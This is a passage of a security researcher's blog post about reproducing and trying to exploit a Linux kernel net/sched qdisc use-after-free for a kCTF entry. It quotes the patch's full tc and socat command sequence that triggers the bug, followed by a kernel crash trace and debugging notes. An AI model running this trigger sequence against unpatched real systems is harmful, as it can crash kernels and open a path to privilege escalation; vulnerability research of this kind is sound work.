---
layout: post
title: "Patch-Gapping the Google Container-Optimized OS for $0"
date: 2025-02-13
classes: wide
header:
  teaser: /assets/images/avatar.jpg
tags:
  - kCTF
  - CTF
  - Kernel
  - Exploit
---

## Background
I'm trying to really focus this year on developing technically in a few ways. Part of that is reviewing kCTF entries. This helps me get a sense of what subsystems are producing the most bugs at the moment in the program and also keeps me up to date on buggy patterns to look for. Also I get to shamelessly steal players' exploitation techniques as well. A lot of recent bugs have come from `/net/sched` so I was looking at patches for the subsystem and found a patch that claimed an exploitable UAF was possible. That patch is [here](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=bc50835e83f60f56e9bec2b392fb5544f250fb6f). I didn't realize at the time, but "Lion Ackermann" mentioned in the patch as the bug discoverer (and presumably exploiter) is a kCTF player.

I checked and discovered that at the time I found the patch the COS 105 instance in kCTF was still vulnerable to this bug. I stopped looking then, but lesson learned, the LTS instance was also still vulnerable. I don't know exactly how the rules work, but this bug was exploited as a 0day entry as per the public kCTF responses spreadsheet in December, but at the time I started working on it, there were no patch links in the spreadsheet for this bug and the instances remained unpatched.

At this point I started trying to figure out the bug and possibly exploit it. My goal was to patch-gap the COS 105 instance with a 1day entry. Shortly after I began investigating the bug, a new release was announced, but luckily the new instances would be vulnerable as well as they had also not been patched. Since the COS 105 slot was unexploited, and the upcoming COS 105 instance would also be vulnerable, I mistakenly took this as a signal to not rush as the instance would probably remain unexploited while I worked on the project slowly. In hindsight, I should've worked harder on this as the COS 105 instance was exploited a few hours before I finished. It may be moot anyways since the bug was exploited previously in the program as a 0day, still not sure about that. Anyways, I encountered some self-inflicted roadblocks that really hindered my progress, we'll get into those. Next time I'll work harder and dedicate more time to the effort instead of just a few hours here and there at night. 

## Patch Analysis
The patch text is very descriptive and provides a nice proof-of-concept to reproduce the buggy condition:
```terminal
net: sched: Disallow replacing of child qdisc from one parent to another
Lion Ackermann was able to create a UAF which can be abused for privilege
escalation with the following script

Step 1. create root qdisc
tc qdisc add dev lo root handle 1:0 drr

step2. a class for packet aggregation do demonstrate uaf
tc class add dev lo classid 1:1 drr

step3. a class for nesting
tc class add dev lo classid 1:2 drr

step4. a class to graft qdisc to
tc class add dev lo classid 1:3 drr

step5.
tc qdisc add dev lo parent 1:1 handle 2:0 plug limit 1024

step6.
tc qdisc add dev lo parent 1:2 handle 3:0 drr

step7.
tc class add dev lo classid 3:1 drr

step 8.
tc qdisc add dev lo parent 3:1 handle 4:0 pfifo

step 9. Display the class/qdisc layout

tc class ls dev lo
 class drr 1:1 root leaf 2: quantum 64Kb
 class drr 1:2 root leaf 3: quantum 64Kb
 class drr 3:1 root leaf 4: quantum 64Kb

tc qdisc ls
 qdisc drr 1: dev lo root refcnt 2
 qdisc plug 2: dev lo parent 1:1
 qdisc pfifo 4: dev lo parent 3:1 limit 1000p
 qdisc drr 3: dev lo parent 1:2

step10. trigger the bug <=== prevented by this patch
tc qdisc replace dev lo parent 1:3 handle 4:0

step 11. Redisplay again the qdiscs/classes

tc class ls dev lo
 class drr 1:1 root leaf 2: quantum 64Kb
 class drr 1:2 root leaf 3: quantum 64Kb
 class drr 1:3 root leaf 4: quantum 64Kb
 class drr 3:1 root leaf 4: quantum 64Kb

tc qdisc ls
 qdisc drr 1: dev lo root refcnt 2
 qdisc plug 2: dev lo parent 1:1
 qdisc pfifo 4: dev lo parent 3:1 refcnt 2 limit 1000p
 qdisc drr 3: dev lo parent 1:2

Observe that a) parent for 4:0 does not change despite the replace request.
There can only be one parent.  b) refcount has gone up by two for 4:0 and
c) both class 1:3 and 3:1 are pointing to it.

Step 12.  send one packet to plug
echo "" | socat -u STDIN UDP4-DATAGRAM:127.0.0.1:8888,priority=$((0x10001))
step13.  send one packet to the grafted fifo
echo "" | socat -u STDIN UDP4-DATAGRAM:127.0.0.1:8888,priority=$((0x10003))

step14. lets trigger the uaf
tc class delete dev lo classid 1:3
tc class delete dev lo classid 1:1

The semantics of "replace" is for a del/add _on the same node_ and not
a delete from one node(3:1) and add to another node (1:3) as in step10.
While we could "fix" with a more complex approach there could be
consequences to expectations so the patch takes the preventive approach of
"disallow such config".
```

The bug here is that a qdisc can be "re-parented" to a class that is not its original parent. This kind of logic was not intended. When you create these types of classes that can have qdiscs attached, a default qdisc is allocated and you can graft a new qdisc to the class afterwards to replace the current qdisc. So you can see that `class 1:3` is first created and then we graft a qdisc onto it in step 8. This will free the default qdisc and instantiate this one in its place and attach it to the class. 

The bug however, lets you graft that qdisc (handle 4:0) onto a different class by using the same grafting mechanism that we used on 3:1 but now we're grafting the same qdisc onto two classes. The patch points out the side effects of this bug are basically this:
1. From qdisc 4:0's point of view, it's parent is still class 3:1, that is never changed
2. From class 3:1's perspective, qdisc 4:0 is still its child qdisc
3. From class 1:3's perspective, qdisc 4:0 is now its child qdisc
4. The refcount on the qdisc is now 2: 1 from the initial graft onto 3:1 and another 1 from the re-parent graft onto 1:3

So those are the side effects the bug produces. At this point, I didn't know a single thing about `/net/sched`, classes, qdiscs, etc, so the learning curve during this process was steep. I had never dealt with this subsystem before in my life. But after a lot of Googling and ChatGPTing, I was able to reproduce the PoC in the patch with the `tc` utility just as the patch specifies. I went through all the steps and when I got to step 14 and it was time to trigger the UAF, I got the following splat after deleting class 1:3\:
```terminal
[   10.519000] ------------[ cut here ]------------
[   10.521778] list_del corruption, ffff8fdd50a008d0->next is NULL
[   10.525296] WARNING: CPU: 0 PID: 784 at lib/list_debug.c:49 __list_del_entry_valid+0x59/0xd0
[   10.530218] Modules linked in:
[   10.532091] CPU: 0 PID: 784 Comm: tc.bin Not tainted 5.15.173+ #1
[   10.535676] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.14.0-2 04/01/2014
[   10.540545] RIP: 0010:__list_del_entry_valid+0x59/0xd0
[   10.543555] Code: 48 8b 00 48 39 f8 75 67 48 8b 52 08 48 39 c2 75 74 b8 01 00 00 00 c3 cc cc cc cc 48 89 fe 48 c7 c7 80 71 cf a7 e8 e3a
[   10.554231] RSP: 0018:ffffa1020168b940 EFLAGS: 00010282
[   10.557286] RAX: 0000000000000000 RBX: ffff8fdd50a00880 RCX: 0000000000000000
[   10.561417] RDX: 0000000000000000 RSI: ffffa1020168b770 RDI: 00000000ffffffea
[   10.565575] RBP: 0000000000010003 R08: 00000000ffffdfff R09: 0000000000000001
[   10.570036] R10: 00000000ffffdfff R11: ffffffffa8669da0 R12: 0000000000000001
[   10.574238] R13: ffff8fdd44f8e000 R14: ffffffffa7ad11e0 R15: 0000000000010000
[   10.578407] FS:  000000001a406880(0000) GS:ffff8fdd5c400000(0000) knlGS:0000000000000000
[   10.583118] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   10.586532] CR2: 00000000005a6cc0 CR3: 0000000110d5a003 CR4: 0000000000370ef0
[   10.590718] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
[   10.594898] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
[   10.599087] Call Trace:
[   10.600704]  <TASK>
[   10.602011]  ? __warn+0x81/0x100
[   10.603979]  ? __list_del_entry_valid+0x59/0xd0
[   10.606673]  ? report_bug+0x99/0xc0
[   10.608785]  ? handle_bug+0x34/0x80
[   10.610901]  ? exc_invalid_op+0x13/0x60
[   10.613228]  ? asm_exc_invalid_op+0x16/0x20
[   10.615710]  ? __list_del_entry_valid+0x59/0xd0
[   10.618473]  drr_qlen_notify+0x12/0x50
[   10.620778]  qdisc_tree_reduce_backlog+0x84/0x160
[   10.623558]  drr_delete_class+0x104/0x210
[   10.625959]  tc_ctl_tclass+0x488/0x5a0
[   10.628214]  ? exc_page_fault+0x76/0x140
[   10.630556]  rtnetlink_rcv_msg+0x21e/0x350
[   10.633230]  ? security_sock_rcv_skb+0x31/0x50
[   10.635869]  ? rtnl_calcit.isra.0+0x130/0x130
[   10.638517]  netlink_rcv_skb+0x4e/0x100
[   10.640868]  netlink_unicast+0x231/0x370
[   10.643209]  netlink_sendmsg+0x250/0x4b0
[   10.645546]  __sock_sendmsg+0x5c/0x70
[   10.647746]  ____sys_sendmsg+0x25a/0x2a0
[   10.650116]  ? import_iovec+0x17/0x20
[   10.652338]  ___sys_sendmsg+0x96/0xd0
[   10.654575]  __sys_sendmsg+0x76/0xc0
[   10.656746]  do_syscall_64+0x3d/0x90
[   10.658970]  entry_SYSCALL_64_after_hwframe+0x6c/0xd6
[   10.662043] RIP: 0033:0x4e7697
[   10.663880] Code: 64 89 02 48 c7 c0 ff ff ff ff eb bb 0f 1f 80 00 00 00 00 f3 0f 1e fa 64 8b 04 25 18 00 00 00 85 c0 75 10 b8 2e 00 000
[   10.674696] RSP: 002b:00007ffc56673e38 EFLAGS: 00000246 ORIG_RAX: 000000000000002e
[   10.679091] RAX: ffffffffffffffda RBX: 0000000067ae1e0c RCX: 00000000004e7697
[   10.683247] RDX: 0000000000000000 RSI: 00007ffc56673ea0 RDI: 0000000000000043
[   10.687411] RBP: 00007ffc56674fb0 R08: 00000000005978a0 R09: 000000001a4102b0
[   10.691609] R10: 000000001a4082a0 R11: 0000000000000246 R12: 0000000000578448
[   10.695807] R13: 000000000054449b R14: 00000000005af620 R15: 0000000000000001
[   10.699977]  </TASK>
[   10.701360] ---[ end trace 8e001f66f1703586 ]---
```

At this point I was excited because I thought I had recreated the bug and caused a UAF and I'd soon be looking for ways to exploit the bug; however I was extremely wrong. All this splat is is a warning that there was an invalid `list_del` operation. In my development environment, this was enough to cause a kernel panic. I had KASAN enabled so if there was a UAF I would've seen a different splat, so now I'm very confused. On further inspection, I never even reached the step where I delete class 1:1 as in the PoC, so what is going on? Why does my PoC stop here on this `list_del` operation? Time to dig into the details. 

First, why do even encounter a bad `list_del` operation? We still don't know much about this bug or subsystem yet. I had basically just recreated the PoC in the patch and had done almost zero critical thinking of my own. After a lot of `printk` debugging, I finally figured out where the invalid `list_del` comes from. 
